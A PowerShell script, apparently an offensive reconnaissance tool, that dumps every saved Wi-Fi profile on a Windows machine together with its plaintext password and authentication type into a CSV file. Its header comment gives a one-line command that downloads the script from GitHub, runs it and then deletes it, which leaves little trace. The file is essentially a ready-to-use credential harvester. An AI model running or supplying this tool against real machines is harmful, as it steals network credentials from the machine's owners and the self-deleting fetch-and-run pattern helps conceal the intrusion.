#Example: Invoke-WebRequest -Uri https://raw.githubusercontent.com/Elder4Ever/Powershell/main/Recon/Invoke-WifiRecon.ps1 -OutFile Invoke-WifiRecon.ps1; ./Invoke-WifiRecon.ps1 -Output C:\test.csv; Remove-Item Invoke-WifiRecon.ps1

param(
    $Output
)

$wifi = $(netsh.exe wlan show profiles)
 
if ($wifi -match "There is no wireless interface on the system."){
    Write-Output $wifi
    exit 
}
 
$ListOfSSID = ($wifi | Select-string -pattern "\w*All User Profile.*: (.*)" -allmatches).Matches | ForEach-Object {$_.Groups[1].Value}
$NumberOfWifi = $ListOfSSID.count
Write-Warning "[$(Get-Date)] I've found $NumberOfWifi Wi-Fi Profile(s) stored in the system"
ForEach($SSID in $ListOfSSID){

        $passphrase = ($(netsh.exe wlan show profiles name=`"$SSID`" key=clear) | Select-String -pattern ".*Key Content.*:(.*)" -allmatches).Matches | ForEach-Object {$_.Groups[1].Value}
        $Auth = ($(netsh.exe wlan show profiles name=`"$SSID`" key=clear) | Select-String -pattern ".*Authentication.*:(.*)" -AllMatches).Matches | ForEach-Object {$_.Groups[1].Value}
        $Auth = $Auth -split "  "
        $List = [PSCustomObject]@{"PROFILE_NAME"=$SSID;"Authentication"=$Auth[0];"PASSWORD"=$passphrase}
        $List | Export-Csv -Path "$Output" -Append -NoTypeInformation
}
